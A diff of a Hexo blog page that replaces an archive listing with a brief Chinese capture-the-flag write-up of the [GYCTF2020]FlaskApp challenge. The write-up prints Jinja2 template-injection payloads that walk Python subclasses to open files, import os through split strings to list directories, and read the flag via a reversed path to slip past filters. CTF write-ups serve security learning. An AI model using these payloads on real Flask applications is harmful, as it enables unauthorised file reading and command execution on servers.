@@ -16,7 +16,7 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>Archives ~ Hexo</title>
+  <title>[GYCTF2020]FlaskApp ~ Hexo</title>
 
   <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"  >
 <link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css"  >
@@ -40,7 +40,7 @@
 
 
 <body>
-  <header style="height: 80vh;">
+  <header style="height: 70vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand"
@@ -114,6 +114,41 @@
             </span>
 
             
+              <br>
+              
+                <p class="mt-3">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
+                  Sunday, May 3rd 2020, 6:48 pm
+                </p>
+              
+
+              <p>
+                
+                  
+                  &nbsp;<i class="far fa-chart-bar"></i>
+                  <span class="post-count">
+                    188 字
+                  </span>&nbsp;
+                
+
+                
+                  
+                  &nbsp;<i class="far fa-clock"></i>
+                  <span class="post-count">
+                      1 分钟
+                  </span>&nbsp;
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
+                  <span id="busuanzi_container_page_pv">
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>&nbsp;
+                
+              </p>
+            
           </div>
 
           
@@ -124,77 +159,78 @@
 
   <main>
     
-      <div class="container nopadding-md">
-        <div class="py-5 z-depth-3" id="board">
-          
-          <div class="container">
-            <div class="row">
-              <div class="col-12 col-md-10 m-auto">
-                
-
-<div class="list-group">
-  <p class="h4">49 posts in total.</p>
-  <hr>
-  
-    
       
-      <p class="h5">2020</p>
-    
-    <a href="/2020/02/27/php-intval-%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%EF%BC%8Cis-numeric-%E6%BC%8F%E6%B4%9E%EF%BC%8C%E7%BB%95%E8%BF%87%E5%9B%9E%E6%96%87%E5%88%A4%E6%96%AD/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">php intval()函数漏洞，is_numeric() 漏洞，绕过回文判断</span>
-      <span style="float: right;">02-27</span>
-    </a>
-  
-    
-    <a href="/2020/02/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">攻防世界pwn1</span>
-      <span style="float: right;">02-15</span>
-    </a>
-  
-    
-    <a href="/2020/02/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cstack2/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">攻防世界stack2</span>
-      <span style="float: right;">02-11</span>
-    </a>
-  
-    
-    <a href="/2020/02/10/CG-CTF-Stack-Overflow/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">CG-CTF Stack Overflow</span>
-      <span style="float: right;">02-10</span>
-    </a>
-  
-    
-    <a href="/2020/02/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cforgot/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">攻防世界forgot</span>
-      <span style="float: right;">02-08</span>
-    </a>
-  
-    
-    <a href="/2020/02/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMary-Morton/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">攻防世界Mary_Morton</span>
-      <span style="float: right;">02-08</span>
-    </a>
-  
-    
-    <a href="/2020/02/03/XCTF-int-overflow/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">XCTF int_overflow</span>
-      <span style="float: right;">02-03</span>
-    </a>
-  
-    
-    <a href="/2020/02/01/jarvisoj-pwn-smashes/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">jarvisoj pwn smashes</span>
-      <span style="float: right;">02-01</span>
-    </a>
-  
-</div>
 
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto" id="post">
+          <div class="markdown-body">
+            <h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>在提示页面f12发现了一段神奇的cookie</p>
+<blockquote>
+<p>eyJjc3JmX3Rva2VuIjoiOTAzM2UwYTY2YzhhOTM3N2NjYmNlMTIwNDcyZmZkYWVhMTg3YTljNyJ9.Xq5hWQ.wd9G8fR8lwO4P_W-GS9Dxbp70kQ</p>
+</blockquote>
+<p>在网站的解密页面解密一下。突然就跳转到了一个神奇的页面</p>
+<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200503171137795.png" srcset="/img/loading.gif" alt="image-20200503171137795"></p>
+<p>发现这是WSGI</p>
+<p>在加密界面输入12，解密解密成功回显12</p>
+<p>这里有个脚本</p>
+<blockquote>
+<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
+> ```
 
-              </div>
-            </div>
+![image-20200503183556194](C:\Users\ykpc\AppData\Roaming\Typora\typora-user-images\image-20200503183556194.png)
+
+`{{''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}`
+
+最后用切片操作读取flag
+
+`{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}{% endif %}{% endfor %}`</code></pre></blockquote>
+<p>下面是一些链接：</p>
+<p><a href="https://www.cnblogs.com/zaqzzz/p/10251892.html" target="_blank" rel="noopener">https://www.cnblogs.com/zaqzzz/p/10251892.html</a></p>
+<p><a href="https://lihuaiqiu.github.io/2019/07/07/SSTI模板注入-Jinja2/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/</a></p>
+
+            <hr>
+          </div>
+          <br>
+          <div>
+            <p>
+            
+            
+            </p>
+            
           </div>
         </div>
       </div>
+    </div>
+    <div class="d-none d-lg-block col-lg-2 toc-container">
+      
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+    <div id="tocbot"></div>
+  </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+      <br><br>
+      
+      
+
+    
+  </div>
+</div>
+
     
   </main>
 
@@ -269,6 +305,11 @@
 
 
 
+  
+    <script src="/lib/tocbot/tocbot.min.js" ></script>
+  
+  <script src="/js/post.js" ></script>
+
 
 
   <script src="/lib/smooth-scroll/smooth-scroll.min.js" ></script>
@@ -309,7 +350,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "Archive&nbsp;",
+        "[GYCTF2020]FlaskApp&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
